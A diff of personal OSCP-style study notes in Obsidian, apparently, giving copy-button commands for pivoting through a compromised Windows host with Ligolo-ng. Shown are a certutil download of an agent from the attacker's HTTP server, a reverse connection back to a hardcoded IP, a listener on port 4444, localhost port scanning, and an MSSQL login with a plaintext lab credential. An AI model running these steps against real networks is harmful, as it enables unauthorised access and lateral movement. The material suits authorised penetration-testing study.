@@ -1,7 +1,205 @@
 [[Sending payload reverse direction through ligolo pivot]]
+# Quick Setup
 
+On KALI :
+
+Step 1 : Create the TUN interface and bring it up
 ```dataviewjs
 const command = `sudo ip tuntap add user kali mode tun ligolo && sudo ip link set dev ligolo up`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    await navigator.clipboard.writeText(command);
+    button.textContent = "Copied!";
+    setTimeout(() => button.textContent = command, 250);
+});
+```
+
+Step 2 : Start Ligolo Interface
+```dataviewjs
+const command = `cd ~/Desktop/Tools/Ligolo/ && ./proxy -laddr 0.0.0.0:11601 -selfcert`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    await navigator.clipboard.writeText(command);
+    button.textContent = "Copied!";
+    setTimeout(() => button.textContent = command, 250);
+});
+```
+
+Step 3 : Host agent.exe, transfer to TARGET
+
+On KALI, start the python server
+```dataviewjs
+const command = `python -m http.server 80 --directory ~/Desktop/Tools/Ligolo/Agent`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    await navigator.clipboard.writeText(command);
+    button.textContent = "Copied!";
+    setTimeout(() => button.textContent = command, 250);
+});
+```
+
+On TARGET, initiate the transfer
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `certutil -urlcache -split -f http://${KaliIP}/WindowsAMD64Agent.exe agent.exe`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+
+Step 4 : On TARGET, start the agent.
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `.\\agent.exe -connect 192.168.45.186:11601 -ignore-cert`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+
+Step 5 : On KALI Ligolo Interface, select the session and start it
+```dataviewjs
+const command = `session`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    await navigator.clipboard.writeText(command);
+    button.textContent = "Copied!";
+    setTimeout(() => button.textContent = command, 1000);
+});
+```
+```dataviewjs
+const command = `1`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    await navigator.clipboard.writeText(command);
+    button.textContent = "Copied!";
+    setTimeout(() => button.textContent = command, 1000);
+});
+```
+```dataviewjs
+const command = `start`;
 
 const button = dv.container.createEl("button", {
     text: command
@@ -25,6 +223,199 @@ button.addEventListener("click", async () => {
 });
 ```
 
+Step 6 : In KALI Ligolo Interface, pull up ipconfig and add to route on KALI
+```dataviewjs
+const command = `ifconfig`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    await navigator.clipboard.writeText(command);
+    button.textContent = "Copied!";
+    setTimeout(() => button.textContent = command, 250);
+});
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `sudo ip route add {INTERNAL_IP}/24 dev ligolo`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+
+Step 7 : Test if pivot works
+```dataviewjs
+const command = `ping {INTERNAL_IP}`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    await navigator.clipboard.writeText(command);
+    button.textContent = "Copied!";
+    setTimeout(() => button.textContent = command, 250);
+});
+```
+
+---
+# Add a listener
+
+```dataviewjs
+const command = `listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    await navigator.clipboard.writeText(command);
+    button.textContent = "Copied!";
+    setTimeout(() => button.textContent = command, 250);
+});
+```
+
+---
+## **Access to agent’s local ports (127.0.0.1):**
+
+On KALI : 
+```dataviewjs
+const command = "sudo ip route add 240.0.0.1/32 dev ligolo";
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    await navigator.clipboard.writeText(command);
+    button.textContent = "Copied!";
+    setTimeout(() => button.textContent = command, 250);
+});
+```
+
+Enumerate localhost ports
+```dataviewjs
+const command = "nmap 240.0.0.1 -sCV";
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    await navigator.clipboard.writeText(command);
+    button.textContent = "Copied!";
+    setTimeout(() => button.textContent = command, 250);
+});
+```
+
+Access future local port services with 240.0.0.1
+```dataviewjs
+const command = "impacket-mssqlclient svc_mssql:'Service1'@240.0.0.1 -windows-auth -p 1433";
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    await navigator.clipboard.writeText(command);
+    button.textContent = "Copied!";
+    setTimeout(() => button.textContent = command, 250);
+});
+```
+
+---
 
 Listener_list
 Listener_stop
@@ -244,7 +635,6 @@ If ping works → pivot is **fully functional** ✅
 If you need to access the local ports of the currently connected agent, there’s a “magic” CIDR hardcoded in Ligolo-ng: _240.0.0.0/4_ (This is an unused IPv4 subnet). If you query an IP address on this subnet, Ligolo-ng will automatically redirect traffic to the agent’s local IP address (127.0.0.1).
 
 Now, back to your kali machine run this to do port forwarding.
-
 ```dataviewjs
 const command = "sudo ip route add 240.0.0.1/32 dev ligolo";
 
